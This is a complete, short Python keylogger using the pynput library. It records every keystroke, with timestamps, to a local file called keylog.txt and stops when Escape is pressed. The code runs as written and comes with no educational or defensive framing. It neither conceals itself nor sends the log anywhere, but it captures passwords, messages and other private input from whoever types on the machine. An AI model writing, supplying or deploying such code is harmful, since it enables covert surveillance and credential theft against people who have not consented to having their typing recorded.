from pynput.keyboard import Listener, Key
import logging

# Set up logging to save the keystrokes to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')  # Record the key pressed
    except AttributeError:
        logging.info(f'Special key pressed: {key}')  # Handle special keys like space, enter, etc.

def on_release(key):
    # Stop listener if 'esc' is pressed
    if key == Key.esc:
        logging.info("Escape key pressed, stopping keylogger.")
        return False  # This will stop the listener and exit the program

# Set up the listener to monitor keyboard input
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
